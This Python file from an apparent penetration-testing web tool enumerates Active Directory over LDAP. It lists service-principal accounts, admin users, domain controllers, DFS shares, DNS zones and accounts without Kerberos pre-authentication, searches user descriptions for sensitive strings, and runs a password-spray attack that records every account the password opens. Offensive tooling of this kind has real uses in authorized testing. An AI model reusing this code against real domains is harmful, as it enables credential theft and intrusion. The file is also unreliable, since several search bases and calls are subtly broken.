"""
ENUMERATION WITH LDAP
"""

from ldap3 import Server, SUBTREE, ObjectDef, AttrDef, Reader, Entry, Attribute, OperationalAttribute
from ldap3.protocol.microsoft import security_descriptor_control
from pentestui.pentest_api.enumeration.ldap.connection import SimpleBind, passwordSprayAttack
from pentestui.pentest_api.enumeration.ldap.status import ConnectionStatus
from pentestui.pentest_api.attacks.asreproast import GetasreProcessENUM
from pentestui.pentest_api.models import ProcessUI
from pentestui.pentest_api.attacks.dns.resolution import DNSResolution

import sys, os


class DomainPars:
    """Detection To Domain Name"""
    def DetectDomainLen2(self, DomainName):
        """Parent Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]

    def DetectDomainLen3(self, DomainName):
        """Child Domain Detection"""
        self.dc1 = DomainName.split('.')[0]
        self.dc2 = DomainName.split('.')[1]
        self.dc3 = DomainName.split('.')[2]


class SpnUserEnum(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """Spn User ENUMERATION Class """
    def QuerySPNToAD(self, ldapusername, ldapassword, serverIP , domainName, user):
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP ,domainName)

            if self.connectionStatus == 'Simple Bind OK':
                oName = 'SPN User Enumeration'
                self.spnusers = []
                # self.SimpleConnection
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap Service Principal Name
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1, self.dc2), '(&(objectClass=computer)(servicePrincipalName=*))', attributes=['SAMAccountName'])
                    total = self.SimpleConnection.entries

                    # For Enumeration
                    if len(total) == 0:
                        self.spnusers.append('Not Found')
                        # Insert database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.spnusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.spnusers.append(entry['sAMAccountName'])

                        # Insert database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.spnusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                elif len(domainName.split('.')) == 3:
                    # Child Domain Name
                    self.DetectDomainLen3(domainName)
                    # Ldap Service Principal Name
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1, self.dc2, self.dc3), '(&(objectClass=computer)(servicePrincipalName=*))', attributes=['SAMAccountName'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.spnusers.append('Not Found')
                        # Insert database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.spnusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.spnusers.append(entry['sAMAccountName'])

                        # Insert database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.spnusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    # Without Child Or parent Domain
                    self.domainParsError = 'Just Parent Or Child Domain'
            else:
                self.LdapConenctionError = 'Connection Is Not Performent'

        if self.socketstatuts == 'Close':
            self.spnusers = []
            self.spnusers.append('LDAP Connection Could Not Performed')


class DomainAdminsEnum(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """ Domain Admins Members Enumeration Class"""
    def QueryMemberToAD(self, ldapusername, ldapassword, serverIP, domainName, user):

        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)

            if self.connectionStatus == 'Simple Bind OK':
                oName = 'Domain Admins Enumeration'
                self.domainadmins = []
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap sdAdmin  https://docs.microsoft.com/en-us/previous-versions/technet-magazine/ee361593(v=msdn.10)?redirectedfrom=MSDN
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1, self.dc2), '(&(objectCategory=user)(adminCount=1))',attributes=['sAMAccountName'])
                    total = self.SimpleConnection.entries

                    # For Enumeration
                    if len(total) == 0:
                        self.domainadmins.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.domainadmins, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:
                        for entry in total:
                            self.domainadmins.append(entry['sAMAccountName'])
                        # Insert TO database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.domainadmins, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                elif len(domainName.split('.')) == 3:
                    self.DetectDomainLen3(domainName)
                    # Ldap Group Members
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1, self.dc2, self.dc3), '(&(objectCategory=user)(adminCount=1))', attributes=['sAMAccountName'])
                    total = self.SimpleConnection.entries

                    # For Enumeration
                    if len(total) == 0:
                        self.domainadmins.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.domainadmins, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:
                        for entry in total:
                            self.domainadmins.append(entry['sAMAccountName'])
                        # Insert TO database
                        RegisterToDb = ProcessUI(operationName=oName, result=self.domainadmins, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Performent'

        elif self.socketstatuts == 'Close':
            self.domainadmins = []
            self.domainadmins.append('LDAP Connection Could Not Performed')


class DFSharesEnum(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """ Distributed File System Share Enumeration """
    def QueryDfsharesToAD(self, ldapusername, ldapassword, serverIP, domainName, user):

        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)
            if self.connectionStatus == 'Simple Bind OK':
                self.dfshares = []
                oName = 'DFS Shares Enumeration'
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap DFShares
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), "(&(objectClass=msDFS-Namespacev2))", controls=controls, attributes=['cn'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dfshares.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dfshares, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:
                        for entry in total:
                            self.dfshares.append(entry['cn'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dfshares, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                elif len(domainName.split('.')) == 3:

                    self.DetectDomainLen3(domainName)
                    # Ldap DFShares
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), "(&(objectClass=msDFS-Namespacev2))", controls=controls, attributes=['cn'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dfshares.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dfshares, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:
                        for entry in total:
                            self.dfshares.append(entry['cn'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dfshares, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

                # Connection Error
            else:
                self.LdapConenctionError = 'Connection Is Not Performent'

        elif self.socketstatuts == 'Close':
            self.dfshares = []
            self.dfshares.append('LDAP Connection Could Not Performed')


class DomainControllersEnum(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """Domain Controllers Enumeration"""
    def QueryPolicyToAD(self, ldapusername, ldapassword, serverIP, domainName, user):

        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)

            if self.connectionStatus == 'Simple Bind OK':

                oName = 'Domain Controllers Enumeration'
                self.dcnames = []
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap DC
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), " (&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", controls=controls, attributes=['cn'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dcnames.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dcnames, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:
                        for entry in total:
                            self.dcnames.append(entry['cn'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dcnames, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                elif len(domainName.split('.')) == 3:

                    self.DetectDomainLen3(domainName)
                    # Ldap DC
                    self.SimpleConnection.search('dc=%s,dc%s,dc=%s'%(self.dc1, self.dc2, self.dc3), "(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))", controls=controls, attributes=['cn'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dcnames.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dcnames, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                    else:

                        for entry in total:
                            self.dcnames.append(entry['cn'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dcnames, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Performent'

        elif self.socketstatuts == 'Close':
            self.dcnames = []
            self.dcnames.append('LDAP Connection Could Not Performed')

class SensitiveDataSearch(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """ Sensitive Data Search Enumeration"""
    def SearchData(self, ldapusername, ldapassword, serverIP, domainName, sensitiveData, user):
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap simple Connection For Data search
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)

            if self.connectionStatus == 'Simple Bind OK':
                oName = 'Sensitive Data Search'
                self.sensitiveData = []
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap Sensitive Data Search
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), "(&(&(objectCategory=person)(objectClass=user))(|(description=*%s*)(comment=*%s*)))"%(sensitiveData, sensitiveData), controls=controls,  attributes=['description'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.sensitiveData.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.sensitiveData, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:

                        for entry in total:
                            self.sensitiveData.append(entry['description'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.sensitiveData, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                if len(domainName.split('.')) == 3:
                    self.DetectDomainLen3(domainName)

                    # Ldap Sensitive Data Search
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), "(&(&(objectCategory=person)(objectClass=user))(|(description=*%s*)(comment=*%s*)))"%(sensitiveData, sensitiveData), controls=controls, attributes=['description'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.sensitiveData.aooend('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.sensitiveData, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.sensitiveData.append(entry['description'])
                        RegisterToDb = ProcessUI(operationName=oName, result=self.sensitiveData, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Perform'

        elif self.socketstatuts == 'Close':
            self.sensitiveData = []
            self.sensitiveData.append('LDAP Connection Could Not Performed')


class DnsZoneEnum(SimpleBind, DomainPars, ConnectionStatus, DNSResolution):
    """Dns Zone Area Enumeration """
    def QueryDnsZoneToAD(self, ldapusername, ldapassword, serverIP, domainName, user):
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)

            if self.connectionStatus == 'Simple Bind OK':
                oName = 'Dns Zone Enumeration'
                self.dnszone = []
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap DNS Zone
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), "(objectClass=DnsZone)", controls=controls, attributes=['name'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dnszone.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dnszone, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.dnszone.append(entry['name'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dnszone, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()
                elif len(domainName.split('.')) == 3:
                    self.DetectDomainLen3(domainName)
                    # Ldap DNS Zone
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), "(objectClass=DnsZone)", controls=controls, attributes=['name'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.dnszone.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.dnszone, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.dnszone.append(entry['name'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.dnszone, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Perform'

        elif self.socketstatuts == 'Close':
            self.dnszone = []
            self.dnszone.append('LDAP Connection Could Not Performed')



class PreAuthUserEnum(SimpleBind, DomainPars, ConnectionStatus, GetasreProcessENUM, DNSResolution):
    """Pre-Authentication Users Enumeration """
    def QueryPreAuthUser(self, ldapusername, ldapassword, serverIP, domainName, user):
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)
            oName = 'Pre-Auth User Enumeration'
            if self.connectionStatus == 'Simple Bind OK':
                self.preauthusers= []
                # Check Domain Name Type
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap Pre Auth Users
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), "(userAccountControl:1.2.840.113556.1.4.803:=4194304)", controls=controls, attributes=['sAMAccountName'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.preauthusers.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.preauthusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.preauthusers.append(entry['sAMAccountName'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.preauthusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                elif len(domainName.split('.')) == 3:
                    self.DetectDomainLen3(domainName)
                    # Ldap Pre Auth Users
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), "(userAccountControl:1.2.840.113556.1.4.803:=4194304)", controls=controls, attributes=['sAMAccountName'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.preauthusers.append('Not Found')
                        RegisterToDb = ProcessUI(operationName=oName, result=self.preauthusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                    else:
                        for entry in total:
                            self.preauthusers.append(entry['sAMAccountName'])

                        RegisterToDb = ProcessUI(operationName=oName, result=self.preauthusers, serverIP=serverIP, userinf=user)
                        RegisterToDb.save()

                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Perform'

        elif self.socketstatuts == 'Close':
            self.preauthusers = []
            self.preauthusers.append('LDAP Connection Could Not Performed')



class DomainUsersForSpray(SimpleBind, DomainPars, ConnectionStatus, passwordSprayAttack, DNSResolution):
    """ Password Spray Attack Domain Users """
    def QueryDomainUsers(self, ldapusername, ldapassword, serverIP, domainName, sprayPassword, user):
        self.ResolArguments(serverIP)
        if self.socketstatuts == 'Open':
            # Ldap Simple Connection
            self.ReceivedArguments(ldapusername, ldapassword, serverIP, domainName)
            controls = security_descriptor_control(sdflags=0x4)
            if self.connectionStatus == 'Simple Bind OK':
                # Check DOmain Name Type
                domainusers = []
                if len(domainName.split('.')) == 2:
                    self.DetectDomainLen2(domainName)
                    # Ldap Domain Users
                    self.SimpleConnection.search('dc=%s,dc=%s'%(self.dc1,self.dc2), '(&(objectCategory=person)(objectClass=user))', attributes=['name'])
                    total = self.SimpleConnection.entries
                    if len(total) == 0:
                        self.simpleConnspray.append('Not Found')

                    else:
                        for user in total:
                            domainusers.append(str(user['name']))
                            # Call Passwrd Spray Attack
                        self.DomainUserRequest(serverIP, domainusers, sprayPassword, domainName, user)


                elif len(domainName.split('.')) == 3:
                    self.DetectDomainLen3(domainName)
                    # Ldap Domain Users
                    self.SimpleConnection.search('dc=%s,dc=%s,dc=%s'%(self.dc1,self.dc2,self.dc3), '(&(objectCategory=person)(objectClass=user))', attributes=['name'])
                    total = self.SimpleConnection.entries

                    if len(total) == 0:
                        self.simpleConnspray.append('Not Found')

                    else:
                        for user in total:
                            domainusers.append(str(user['name']))
                        # Call Passwrd Spray Attack
                        self.DomainUserRequest(serverIP, domainusers, sprayPassword, domainName, user)


                else:
                    self.domainParsError = 'Just Parent Or Child Domain'

            else:
                self.LdapConenctionError = 'Connection Is Not Perform'

        elif self.socketstatuts == 'Close':
            self.sprayusers = []
            self.sprayusers.append('LDAP Connection Could Not Performed')



    def DomainUserRequest(self, serverIP, domainusers, sprayPassword, domainName, user):
        """ Pars To Domain """
        oName = 'Password Spray Attack'
        self.sprayusers = []
        domain = '@' + domainName
        for user in domainusers:
            targetuser = user + domain
            self.ReceivedSprayArguments(serverIP, targetuser ,sprayPassword)
            if self.simpleConnspray.bind():
                self.sprayusers.append(targetuser + ':' + sprayPassword)
